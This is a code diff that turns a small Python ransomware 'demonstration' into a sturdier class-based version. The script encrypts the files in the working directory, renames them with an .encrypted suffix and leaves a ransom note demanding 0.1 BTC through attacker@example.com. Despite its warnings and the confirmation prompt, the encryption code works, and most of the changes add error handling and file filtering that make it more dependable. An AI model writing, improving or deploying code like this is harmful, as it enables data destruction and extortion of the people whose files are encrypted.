@@ -1,67 +1,190 @@
 import os
+import logging
 from cryptography.fernet import Fernet
+from datetime import datetime
+import platform
 
-# WARNING: DO NOT RUN THIS CODE - IT WILL ENCRYPT FILES IN THE CURRENT DIRECTORY
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    filename='encryption_demo.log'
+)
 
-def generate_key():
-    """Generate a key for encryption/decryption"""
-    return Fernet.generate_key()
-
-def encrypt_file(filepath, key):
-    """Encrypt a single file"""
-    try:
-        with open(filepath, 'rb') as f:
-            data = f.read()
+class EncryptionDemo:
+    def __init__(self):
+        self.system = platform.system()
+        self.script_name = os.path.basename(__file__)
+        self.critical_paths = self._get_critical_paths()
+        self.skipped_extensions = {'.py', '.exe', '.dll', '.sys', '.encrypted'}
         
-        fernet = Fernet(key)
-        encrypted = fernet.encrypt(data)
-        
-        with open(filepath, 'wb') as f:
-            f.write(encrypted)
+    def _get_critical_paths(self):
+        """Get system-specific critical paths"""
+        if self.system == 'Windows':
+            return [
+                "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
+                "C:\\ProgramData", "C:\\Users\\Default", "C:\\Users\\Public",
+                "C:\\System Volume Information", "C:\\$Recycle.Bin"
+            ]
+        else:  # Linux/Unix
+            return [
+                "/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc",
+                "/run", "/sbin", "/sys", "/usr", "/var", "/root"
+            ]
+
+    def is_safe_to_encrypt(self, filepath):
+        """Check if a file is safe to encrypt"""
+        # Skip critical system files
+        if any(os.path.abspath(filepath).startswith(os.path.abspath(path)) for path in self.critical_paths):
+            return False
             
-        # Rename file to show it's encrypted
-        os.rename(filepath, filepath + '.encrypted')
-        
-    except Exception as e:
-        print(f"Error encrypting {filepath}: {e}")
+        # Skip certain file extensions
+        if any(filepath.lower().endswith(ext) for ext in self.skipped_extensions):
+            return False
+            
+        # Skip the script itself
+        if filepath == self.script_name:
+            return False
+            
+        # Skip if file is already encrypted
+        if filepath.endswith('.encrypted'):
+            return False
+            
+        return True
 
-def encrypt_directory(directory, key):
-    """Encrypt all files in a directory"""
-    for root, _, files in os.walk(directory):
-        for file in files:
-            filepath = os.path.join(root, file)
-            # Skip already encrypted files and python files
-            if not filepath.endswith('.encrypted') and not filepath.endswith('.py'):
-                encrypt_file(filepath, key)
+    def generate_key(self):
+        """Generate a key for encryption/decryption"""
+        try:
+            key = Fernet.generate_key()
+            logging.info("Encryption key generated successfully")
+            return key
+        except Exception as e:
+            logging.error(f"Error generating key: {e}")
+            raise
 
-def create_ransom_note(directory, key):
-    """Create a ransom note with instructions"""
-    note = f"""YOUR FILES HAVE BEEN ENCRYPTED!
+    def encrypt_file(self, filepath, key):
+        """Encrypt a single file with error handling"""
+        try:
+            # Check file size (skip files larger than 100MB)
+            if os.path.getsize(filepath) > 100 * 1024 * 1024:
+                logging.warning(f"Skipping large file: {filepath}")
+                return False
 
-To decrypt your files, you need to pay a ransom and provide this key:
+            with open(filepath, 'rb') as f:
+                data = f.read()
+            
+            fernet = Fernet(key)
+            encrypted = fernet.encrypt(data)
+            
+            with open(filepath, 'wb') as f:
+                f.write(encrypted)
+                
+            # Rename file to show it's encrypted
+            os.rename(filepath, filepath + '.encrypted')
+            logging.info(f"Successfully encrypted: {filepath}")
+            return True
+            
+        except PermissionError:
+            logging.warning(f"Permission denied for file: {filepath}")
+            return False
+        except Exception as e:
+            logging.error(f"Error encrypting {filepath}: {e}")
+            return False
+
+    def encrypt_directory(self, directory, key):
+        """Encrypt files in a directory with safety checks"""
+        try:
+            # Validate directory exists
+            if not os.path.exists(directory):
+                logging.error(f"Directory does not exist: {directory}")
+                return
+
+            # Get list of files to encrypt
+            files_to_encrypt = []
+            for root, _, files in os.walk(directory):
+                for file in files:
+                    filepath = os.path.join(root, file)
+                    if self.is_safe_to_encrypt(filepath):
+                        files_to_encrypt.append(filepath)
+
+            # Log number of files to be encrypted
+            logging.info(f"Found {len(files_to_encrypt)} files to encrypt")
+
+            # Encrypt files
+            encrypted_count = 0
+            for filepath in files_to_encrypt:
+                if self.encrypt_file(filepath, key):
+                    encrypted_count += 1
+
+            logging.info(f"Successfully encrypted {encrypted_count} files")
+            return encrypted_count
+
+        except Exception as e:
+            logging.error(f"Error in encrypt_directory: {e}")
+            return 0
+
+    def create_ransom_note(self, directory, key):
+        """Create a formatted ransom note"""
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            note = f"""YOUR FILES HAVE BEEN ENCRYPTED!
+
+Date: {timestamp}
+System: {self.system}
+
+To decrypt your files, you need to provide this key:
 {key.decode()}
 
 Contact: attacker@example.com
-"""
-    with open(os.path.join(directory, 'READ_ME_RANSOM.txt'), 'w') as f:
-        f.write(note)
+Payment: 0.1 BTC
 
-# WARNING: ACTUAL RANSOMWARE WOULD TARGET MORE FILES AND DIRECTORIES
-if __name__ == "__main__":
+WARNING: This is a demonstration. Do not pay any ransom.
+"""
+            note_path = os.path.join(directory, 'READ_ME_RANSOM.txt')
+            with open(note_path, 'w') as f:
+                f.write(note)
+            logging.info(f"Ransom note created at: {note_path}")
+            return True
+        except Exception as e:
+            logging.error(f"Error creating ransom note: {e}")
+            return False
+
+def main():
     print("WARNING: This is a demonstration of ransomware concepts.")
     print("Do not run this on any system with important files.")
+    print("This code is for educational purposes only.")
     
-    # In real ransomware, this would target user documents, pictures, etc.
-    target_dir = os.getcwd()  # Just using current directory for demo
+    # Create demo instance
+    demo = EncryptionDemo()
     
-    # Generate and print key (in real malware, this would be sent to attacker)
-    key = generate_key()
-    print(f"Generated key: {key.decode()}")
+    # Get user confirmation
+    confirm = input("Do you want to proceed with the demonstration? (yes/no): ")
+    if confirm.lower() != 'yes':
+        print("Operation cancelled.")
+        return
     
-    # Encrypt files
-    encrypt_directory(target_dir, key)
-    
-    # Create ransom note
-    create_ransom_note(target_dir, key)
-    
-    print("Simulation complete. Again, DO NOT USE THIS MALICIOUSLY.")
+    try:
+        # Use current directory for demo
+        target_dir = os.getcwd()
+        
+        # Generate key
+        key = demo.generate_key()
+        print(f"Generated key: {key.decode()}")
+        
+        # Encrypt files
+        encrypted_count = demo.encrypt_directory(target_dir, key)
+        print(f"Encrypted {encrypted_count} files")
+        
+        # Create ransom note
+        if demo.create_ransom_note(target_dir, key):
+            print("Ransom note created successfully")
+        
+        print("\nSimulation complete. Again, DO NOT USE THIS MALICIOUSLY.")
+        print("This demonstration was for educational purposes only.")
+        
+    except Exception as e:
+        logging.error(f"Error in main execution: {e}")
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    main()
